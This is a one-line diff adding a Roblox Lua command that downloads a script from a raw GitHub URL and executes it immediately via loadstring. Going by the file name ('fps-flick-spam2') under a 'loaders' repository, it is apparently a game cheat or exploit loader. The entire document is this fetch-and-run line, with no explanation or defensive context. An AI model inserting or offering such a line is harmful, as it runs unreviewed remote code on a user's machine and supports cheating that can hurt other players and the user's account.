@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/fps-flick-spam2-c6t5nrp9ew8yvl.lua"))()
